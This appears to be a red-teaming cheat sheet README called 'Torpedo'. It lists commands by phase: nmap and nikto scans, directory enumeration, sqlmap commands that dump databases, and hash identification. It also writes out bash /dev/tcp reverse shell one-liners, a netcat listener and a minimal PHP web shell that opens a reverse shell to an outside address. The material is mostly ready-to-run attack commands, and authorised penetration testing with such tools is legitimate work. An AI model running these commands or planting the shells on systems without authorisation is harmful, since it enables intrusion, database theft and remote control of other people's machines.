# Torpedo
Un torpedo para cosas de red teaming

# Recon and Initial Access

## Nmap
Scan all TCP ports quickly
```
nmap -Pn -n -v -sT -p- -T5 10.0.1.2
```

In-depth scan specific ports
```
nmap -Pn -n -v -sT -p 22,80 -A 10.0.1.2
```

## WebApp Scanners
Nikto vulnerability scanner
```
nikto -h 10.1.2.3 -C all
```

[whatweb](https://www.kali.org/tools/whatweb/) web technology identifier
```
whatweb -v -a 3 192.168.0.102
```

## WebApp Enumeration
Path enumeration with dirbuster:
```
dirb http://10.10.11.253
```

## SQL Injection - SQLMap
Check fields in HTTP GET
```
sqlmap -u "http://10.2.3.4/path/vulnerable.php?fieldname=value" -p fieldname --level 5 --risk 3 --dbs
```

Use intercepted request from Burp:
```
sqlmap -r request.txt ...
```

Dump databases:
```
sqlmap -r request.txt -p [parameters to test] --level 5 --risk 3 --dbs
```

Dump tables for given database:
```
sqlmap -r request.txt -p [parameters to test] --level 5 --risk 3 -D db_name --tables
```

Dump given table for given database:
```
sqlmap -r request.txt -p [parameters to test] --level 5 --risk 3 -D db_name -T table_name --dump
```

## Reverse Shells

### Netcat Receiver
```
nc -lvnp [receiving port]
```

### Bash TCP
```
/bin/bash -i >& /dev/tcp/10.1.2.3/1234 0>&1
/bin/bash -l > /dev/tcp/10.1.2.3/1234 0<&1 2>&1
```
[ref](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp)

### Minimal php
```
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.1.2.3/1234 0>&1'");
?>
```

# Post-Exploitation Recon (Linux)
User info, groups, etc
```
whoami
groups
```

Available sudo options
```
sudo -l
```

# Credential Access
## Password Hashes
Lookup hash type:
```
hashid -m "hash"
```

```
$ hashid -m '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
Analyzing '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
```
